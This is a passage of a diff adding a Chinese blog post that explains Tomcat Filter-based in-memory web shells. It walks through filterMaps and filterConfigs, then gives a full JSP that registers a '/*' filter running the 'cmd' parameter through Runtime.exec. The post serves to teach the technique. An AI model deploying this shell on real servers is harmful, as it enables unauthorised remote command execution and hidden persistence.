+<li>若恶意<code>FilterMap</code>的 URL 模式为<code>/*</code>（拦截所有请求），且请求类型匹配（如<code>REQUEST</code>），则<code>matchFilterURL</code>或<code>matchFilterServlet</code>会返回<code>true</code>，判定为 “匹配成功”；</li>
+<li>匹配成功后，<code>createFilterChain</code>会根据<code>filterMap.getFilterName()</code>（恶意 Filter 的名称）去<code>filterConfigs</code>中查找对应的 Filter 实例。</li>
+</ol>
+<h4 id="三-修改filterConfigs让恶意-Filter-被找到">三.  修改<code>filterConfigs</code>让恶意 Filter 被找到</h4>
+<p><code>filterConfigs</code>的作用是通过 Filter 名称关联到具体的 Filter 实例。在<code>createFilterChain</code>中，匹配到恶意<code>FilterMap</code>后，需要通过<code>context.findFilterConfig(filterName)</code>获取 Filter 实例：</p>
+<ul>
+<li><code>findFilterConfig</code>的内部逻辑是从<code>StandardContext</code>的<code>filterConfigs</code>集合（本质是<code>HashMap&lt;String, ApplicationFilterConfig&gt;</code>）中，以<code>filterName</code>为 key 查询对应的<code>ApplicationFilterConfig</code>；</li>
+<li><code>ApplicationFilterConfig</code>中封装了恶意 Filter 的实例（通过<code>filterConfig.getFilter()</code>可获取）。<br>
+攻击者通过<code>standardContext.addFilter(filterName, maliciousFilter)</code>时，Tomcat 内部会自动创建<code>ApplicationFilterConfig</code>并存入<code>filterConfigs</code>：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tomcat内部逻辑：addFilter会将Filter实例封装为ApplicationFilterConfig</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(String filterName, Filter filter)</span> &#123;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    <span class="built_in">this</span>.filterDefs.put(filterName, filterDef); <span class="comment">// 存入filterDefs</span></span><br><span class="line">    <span class="comment">// 同时创建ApplicationFilterConfig并关联到filterConfigs</span></span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, filterDef);</span><br><span class="line">    <span class="built_in">this</span>.filterConfigs.put(filterName, filterConfig); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因此，当<code>createFilterChain</code>调用<code>findFilterConfig</code>时，能直接从<code>filterConfigs</code>中拿到恶意 Filter 的<code>ApplicationFilterConfig</code>，进而获取实例。</p>
+<h4 id="四-确保filters数组包含恶意-Filter">四. <strong>确保<code>filters</code>数组包含恶意 Filter</strong></h4>
+<p><code>filters</code>数组是<code>ApplicationFilterChain</code>的内部数组，用于存储当前请求需要执行的 Filter 实例（封装在<code>ApplicationFilterConfig</code>中）。其内容完全由<code>createFilterChain</code>动态生成，生成逻辑是：</p>
+<ol>
+<li>遍历<code>StandardContext</code>的<code>filterMaps</code>，筛选出所有与当前请求匹配的<code>FilterMap</code>；</li>
+<li>对每个匹配的<code>FilterMap</code>，从<code>filterConfigs</code>中获取对应的<code>ApplicationFilterConfig</code>；</li>
+<li>将这些<code>ApplicationFilterConfig</code>按顺序存入<code>filters</code>数组。<br>
+当攻击者已将恶意 Filter 的<code>FilterMap</code>加入<code>filterMaps</code>，且<code>filterConfigs</code>中存在对应的实例时：</li>
+</ol>
+<ul>
+<li>新请求到达后，<code>createFilterChain</code>会匹配到恶意<code>FilterMap</code>；</li>
+<li>从<code>filterConfigs</code>中找到恶意 Filter 的<code>ApplicationFilterConfig</code>；</li>
+<li>最终将其加入<code>filters</code>数组，导致后续<code>internalDoFilter</code>执行时，按顺序调用恶意 Filter 的<code>doFilter</code>方法。<br>
+<strong>简言之：<code>filters</code>数组是 “临时执行列表”，其内容由<code>filterMaps</code>（规则）和<code>filterConfigs</code>（实例）共同决定，前两者被篡改后，<code>filters</code>数组自然会包含恶意 Filter。</strong></li>
+</ul>
+<h2 id="filter内存马">filter内存马</h2>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*, javax.servlet.http.*&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;  </span><br><span class="line">&lt;%--声明一个恶意Filter--%&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ShellFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span>&#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span>&#123;&#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);  </span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    resp.getWriter().println(line);  </span><br><span class="line">                &#125;  </span><br><span class="line">                br.close();  </span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;  </span><br><span class="line">                chain.doFilter(req,resp);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;  </span><br><span class="line">    &#125;%&gt;  </span><br><span class="line">&lt;%--从ServletContext中获取StandardContext--%&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="comment">// 从request中获取servletContext  </span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();  </span><br><span class="line">    <span class="comment">// 从servletContext中获取applicationContext  </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);  </span><br><span class="line">    <span class="comment">// 从applicationContext中获取standardContext  </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;%--动态注册恶意Filter--%&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="comment">// 创建恶意Filter  </span></span><br><span class="line">    <span class="type">ShellFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellFilter</span>();  </span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">def</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">    def.setFilter(filter);  </span><br><span class="line">    def.setFilterName(<span class="string">&quot;filter-shell&quot;</span>);  </span><br><span class="line">    def.setFilterClass(filter.getClass().getName());  </span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">    map.addURLPattern(<span class="string">&quot;/*&quot;</span>);  </span><br><span class="line">    map.setFilterName(<span class="string">&quot;filter-shell&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    standardContext.addFilterDef(def);  </span><br><span class="line">    standardContext.addFilterMapBefore(map);  </span><br><span class="line">    standardContext.filterStart();  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/15/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC%E9%93%BE%E6%80%BB%E8%A7%88/" rel="prev" title="Java安全之CC链总览">
+                  <i class="fa fa-angle-left"></i> Java安全之CC链总览
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/10/19/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BLIstener%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Java安全之LIstener内存马">
+                  Java安全之LIstener内存马 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
